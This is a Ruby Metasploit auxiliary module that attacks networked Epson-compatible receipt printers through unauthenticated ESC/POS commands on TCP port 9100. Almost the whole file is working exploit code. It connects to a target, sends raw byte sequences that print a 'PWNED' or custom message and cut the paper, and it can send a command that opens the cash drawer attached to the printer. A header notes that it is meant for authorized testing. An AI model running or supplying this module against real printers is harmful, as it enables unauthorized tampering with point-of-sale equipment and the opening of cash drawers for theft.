# encoding: utf-8
#
# Escpos TCP Command Injector for networked Epson-compatible printers
#
# This module exploits an unauthenticated ESC/POS command vulnerability in networked receipt printers.
#
# Example usage:
#   use auxiliary/scanner/printer/escpos_tcp_command_injector
#   set RHOST 192.168.1.100
#   set MESSAGE "Test"
#   run
#
# WARNING: Only use this module on printers you are authorized to test.
#
require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'ESC/POS Printer Command Injector',
      'Description' => %q{
        This module demonstrates an unauthenticated ESC/POS command vulnerability in networked Epson-compatible printers (CVE submitted). 
        By default, it prints "PWNED" (or a custom MESSAGE).
        You can also optionally trigger the cash drawer.
      },
      'Author'      => ['FutileSkills'],
      'License'     => MSF_LICENSE,
      'References'  => [
        ['URL', 'https://github.com/futileskills/Security-Advisory']
      ]
    ))

    register_options(
      [
        Opt::RHOST(),                                      # Target IP
        Opt::RPORT(9100),                                  # Default printer port
        OptString.new('MESSAGE', [true, 'Message to print', 'PWNED']),
        OptBool.new('RUN_EXPLOIT', [true, 'Whether to actually send commands to the printer', true]),
        OptBool.new('TRIGGER_DRAWER', [false, 'Whether to trigger the attached cash drawer', false])
      ]
    )
  end

  # ESC/POS command to trigger the cash drawer
  DRAWER_COMMAND = "\x1b\x70\x00\x19\x32"

  def run
    rhost_ip = rhost
    message = datastore['MESSAGE']
    run_exploit = datastore['RUN_EXPLOIT']
    trigger_drawer = datastore['TRIGGER_DRAWER']

    if run_exploit
      # ESC/POS print commands: initialize, center, double-size font for message, reset alignment, cut
      # "\x1b\x40"      => Initialize printer
      # "\x1b\x61\x01"  => Center alignment
      # "\x1d\x21\x11"  => Double-size font
      # "#{message}"    => User-provided message
      # "\x1d\x21\x00"  => Reset font
      # "\n\x1b\x61\x00\n\n" => Left alignment and extra newlines
      # "\x1d\x56\x42"  => Cut paper
      print_commands = "\x1b\x40\x1b\x61\x01\x1d\x21\x11#{message}\x1d\x21\x00\n\x1b\x61\x00\n\n\x1d\x56\x42"

      begin
        print_status("Sending print message to #{rhost_ip}...")
        connect
        sock.put(print_commands)
        disconnect

        # Optionally trigger the drawer (send twice with short delay)
        if trigger_drawer
          2.times do
            connect
            sock.put(DRAWER_COMMAND)
            disconnect
            sleep(0.5)
          end
          print_status("Triggered cash drawer on #{rhost_ip}")
        end

        print_good("Finished sending commands to #{rhost_ip}")
      rescue ::Rex::ConnectionError
        print_error("Failed to connect to #{rhost_ip}")
      end
    else
      print_status("RUN_EXPLOIT is false; skipping sending commands to #{rhost_ip}")
    end
  end
end
